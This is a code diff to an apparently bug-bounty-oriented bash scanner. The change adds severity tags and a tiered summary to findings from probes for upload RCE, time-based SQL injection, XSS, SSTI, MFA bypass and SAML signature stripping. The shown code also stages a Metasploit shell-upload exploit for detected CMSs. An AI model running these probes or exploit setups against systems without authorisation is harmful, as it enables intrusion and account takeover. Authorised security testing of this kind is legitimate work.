@@ -193,11 +193,11 @@ verify_upload_poc() {
             local resp=$(curl -sk -f --max-time 5 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$probe_url" || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
-                echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
+                echo "[CONFIRMED] [RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
                 rm -f "/tmp/$canary"; return 0
             elif echo "$resp" | grep -q "RCE-VAL-"; then
                 log_vuln "  [POC-UPLOAD-ONLY] File saved but NOT executed (Source visible): $probe_url"
-                echo "[UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
+                echo "[POSSIBLE] [UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
             fi
         done
     done
@@ -234,7 +234,7 @@ if ! skip_has upload; then
             U="${host%/}${path}"
             if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$U")" -eq 200 ]; then
                 log_vuln "Found upload path: $U"
-                echo "[UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
+                echo "[INFORMATIONAL] [UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                 verify_upload_poc "$U"
             fi
         done
@@ -267,15 +267,15 @@ if ! skip_has sqli; then
                     if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                         if verify_sqli_poc "$url" "$i" "$dialect"; then
                             log_crit "EMPIRICAL SQLI POC: $url"
-                            echo "[SQLI-POC-VERIFIED] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
+                            echo "[CONFIRMED] [SQLI-POC-VERIFIED] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                             break 2
                         else
                             log_vuln "SQLi Candidate (confirmed delay but not linear): $url"
-                            echo "[SQLI-CANDIDATE] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
+                            echo "[POSSIBLE] [SQLI-CANDIDATE] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                         fi
                     elif [ "$RC" -eq 28 ] && [ "$TE" -gt 18000 ]; then
                         log_warn "Potential SQLi (Timeout Multiplier): $url"
-                        echo "[SQLI-TIMEOUT-CANDIDATE] timeout=${TE}ms param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
+                        echo "[POSSIBLE] [SQLI-TIMEOUT-CANDIDATE] timeout=${TE}ms param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                     fi
                 done
             done
@@ -325,6 +325,16 @@ PYEOF
             --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
         rm -f "$DAL_DEDUP_FILE"
 
+        # Prefix every dalfox line with [POSSIBLE] — dalfox labels its own output;
+        # impact is not confirmed until manually verified in-browser.
+        if [ -s "$FINDINGS_DIR/xss/dalfox_results.txt" ]; then
+            DAL_TMP=$(mktemp /tmp/dalfox_prefixed_XXXXXX.txt)
+            while IFS= read -r _dal_line; do
+                echo "[POSSIBLE] $_dal_line"
+            done < "$FINDINGS_DIR/xss/dalfox_results.txt" > "$DAL_TMP"
+            mv "$DAL_TMP" "$FINDINGS_DIR/xss/dalfox_results.txt"
+        fi
+
         DALFOX_COUNT=$(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")
         [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
     else
@@ -357,7 +367,7 @@ if ! skip_has ssti; then
                 body=$(curl -sk --max-time 10 ${BB_AUTH_ARGS[@]+"${BB_AUTH_ARGS[@]}"} "$injected" 2>/dev/null || true)
                 if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                     log_crit "SSTI confirmed [$engine]: $injected"
-                    echo "[SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
+                    echo "[CONFIRMED] [SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
                     hit=$(( hit + 1 ))
                     break
                 fi
@@ -382,7 +392,8 @@ if ! skip_has cms; then
             RHOST_VAL=$(dig +short "$HOST_PART" | head -1)
             [ -z "$RHOST_VAL" ] && RHOST_VAL="$HOST_PART"
             
-            echo "use exploit/unix/webapp/${CMS}_admin_shell_upload" > "$MSF_RC"
+            echo "# [INFORMATIONAL] CMS detected — version detection only; exploitability not tested" > "$MSF_RC"
+            echo "use exploit/unix/webapp/${CMS}_admin_shell_upload" >> "$MSF_RC"
             echo "set RHOSTS $RHOST_VAL" >> "$MSF_RC"
             echo "set SSL $([[ "$url" == https* ]] && echo "true" || echo "false")" >> "$MSF_RC"
             echo "set TARGETURI /" >> "$MSF_RC"
@@ -418,7 +429,7 @@ if ! skip_has mfa; then
                 done | sort | uniq -c | sort -rn | head -5)
                 if echo "$STATUS_CODES" | grep -qv "429\|ERR"; then
                     log_vuln "[MFA] No rate limit detected on OTP endpoint: $BASE"
-                    echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES" >> "$FINDINGS_DIR/mfa/findings.txt"
+                    echo "[POSSIBLE] [MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES" >> "$FINDINGS_DIR/mfa/findings.txt"
                 fi
             fi
 
@@ -431,7 +442,7 @@ if ! skip_has mfa; then
                     "$HOST/$PROTECTED" 2>/dev/null || echo "0")
                 if [ "$SKIP_CODE" = "200" ]; then
                     log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
-                    echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
+                    echo "[POSSIBLE] [MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
                 fi
             done
 
@@ -443,7 +454,7 @@ if ! skip_has mfa; then
                     -d '{"otp":"999999"}' 2>/dev/null || true)
                 if echo "$RESP" | grep -qi '"success"\s*:\s*false\|"verified"\s*:\s*false\|"status"\s*:\s*"fail"'; then
                     log_vuln "[MFA] Response manipulation candidate (server sends JSON success flag): $BASE"
-                    echo "[MFA-RESPONSE-MANIP] $BASE | change false->true in response" >> "$FINDINGS_DIR/mfa/findings.txt"
+                    echo "[INFORMATIONAL] [MFA-RESPONSE-MANIP] $BASE | change false->true in response" >> "$FINDINGS_DIR/mfa/findings.txt"
                 fi
             fi
 
@@ -474,7 +485,7 @@ if ! skip_has saml; then
             case "$CODE" in
                 200|301|302|403)
                     log_vuln "[SAML] Endpoint found (HTTP $CODE): ${host}${SAML_PATH}"
-                    echo "[SAML-ENDPOINT] ${host}${SAML_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
+                    echo "[INFORMATIONAL] [SAML-ENDPOINT] ${host}${SAML_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
                     ;;
             esac
         done
@@ -486,7 +497,7 @@ if ! skip_has saml; then
         RESP=$(curl -sk --max-time 8 "$url" 2>/dev/null || true)
         if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
             log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
-            echo "[SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
+            echo "[INFORMATIONAL] [SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
             # Extract cert if present
             echo "$RESP" | grep -o '<X509Certificate>[^<]*' | head -3 >> "$FINDINGS_DIR/saml/certs.txt" 2>/dev/null || true
         fi
@@ -503,7 +514,7 @@ if ! skip_has saml; then
                 -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
             if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
                 log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
-                echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
+                echo "[CONFIRMED] [SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
             fi
         fi
     fi
@@ -515,14 +526,41 @@ fi
 # ── Summary ───────────────────────────────────────────────────────────────────
 log_info "Scan Complete. Consolidating..."
 {
-    echo "Scan Date : $(date)"
-    echo "Target    : $TARGET"
-    echo "Verified SQLi PoCs   : $(grep -c "SQLI-POC-VERIFIED" "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
-    echo "Verified RCE PoCs    : $(count_vuln "$FINDINGS_DIR/upload/verified_rce_pocs.txt")"
-    echo "Verified Upload Only : $(count_vuln "$FINDINGS_DIR/upload/verified_upload_pocs.txt")"
-    echo "XSS (dalfox)         : $(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")"
-    echo "SSTI Confirmed       : $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
-    echo "MFA Bypass Findings  : $(count_vuln "$FINDINGS_DIR/mfa/findings.txt")"
-    echo "SAML/SSO Findings    : $(count_vuln "$FINDINGS_DIR/saml/findings.txt")"
+    echo "Scan Date  : $(date)"
+    echo "Target     : $TARGET"
+    echo ""
+    echo "=== CONFIRMED (submit after /validate) ==="
+    printf "  SQLi PoC (linear-confirmed) : %s\n" \
+        "$(grep -c "\[CONFIRMED\].*SQLI-POC-VERIFIED" "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
+    printf "  RCE PoC (code-executed)     : %s\n" \
+        "$(grep -c "\[CONFIRMED\]" "$FINDINGS_DIR/upload/verified_rce_pocs.txt" 2>/dev/null || echo 0)"
+    printf "  SSTI (math-canary)          : %s\n" \
+        "$(grep -c "\[CONFIRMED\].*SSTI-CONFIRMED" "$FINDINGS_DIR/ssti/ssti_candidates.txt" 2>/dev/null || echo 0)"
+    printf "  SAML sig-strip (session)    : %s\n" \
+        "$(grep -c "\[CONFIRMED\].*SAML-SIG-STRIP" "$FINDINGS_DIR/saml/findings.txt" 2>/dev/null || echo 0)"
+    echo ""
+    echo "=== POSSIBLE (run /validate before submitting) ==="
+    printf "  SQLi delay candidates       : %s\n" \
+        "$(grep -c "\[POSSIBLE\].*SQLI-" "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
+    printf "  XSS (dalfox, unconfirmed)   : %s\n" \
+        "$(grep -c "\[POSSIBLE\]" "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || echo 0)"
+    printf "  MFA rate-limit              : %s\n" \
+        "$(grep -c "\[POSSIBLE\].*MFA-NO-RATE-LIMIT" "$FINDINGS_DIR/mfa/findings.txt" 2>/dev/null || echo 0)"
+    printf "  Upload (file-only)          : %s\n" \
+        "$(grep -c "\[POSSIBLE\].*UPLOAD-ONLY-POC" "$FINDINGS_DIR/upload/verified_upload_pocs.txt" 2>/dev/null || echo 0)"
+    printf "  MFA workflow-skip           : %s\n" \
+        "$(grep -c "\[POSSIBLE\].*MFA-WORKFLOW-SKIP" "$FINDINGS_DIR/mfa/findings.txt" 2>/dev/null || echo 0)"
+    echo ""
+    echo "=== INFORMATIONAL (do not submit without chain) ==="
+    printf "  Upload paths found          : %s\n" \
+        "$(grep -c "\[INFORMATIONAL\].*UPLOAD-CANDIDATE" "$FINDINGS_DIR/upload/active_upload_probe.txt" 2>/dev/null || echo 0)"
+    printf "  SAML endpoints              : %s\n" \
+        "$(grep -c "\[INFORMATIONAL\].*SAML-ENDPOINT" "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null || echo 0)"
+    printf "  SAML metadata exposed       : %s\n" \
+        "$(grep -c "\[INFORMATIONAL\].*SAML-METADATA-EXPOSED" "$FINDINGS_DIR/saml/findings.txt" 2>/dev/null || echo 0)"
+    printf "  CMS detected                : %s\n" \
+        "$(find "$FINDINGS_DIR/metasploit/" -name "*.rc" 2>/dev/null | wc -l | tr -d ' ')"
+    printf "  MFA response-manip canary   : %s\n" \
+        "$(grep -c "\[INFORMATIONAL\].*MFA-RESPONSE-MANIP" "$FINDINGS_DIR/mfa/findings.txt" 2>/dev/null || echo 0)"
 } > "$FINDINGS_DIR/summary.txt"
 cat "$FINDINGS_DIR/summary.txt"
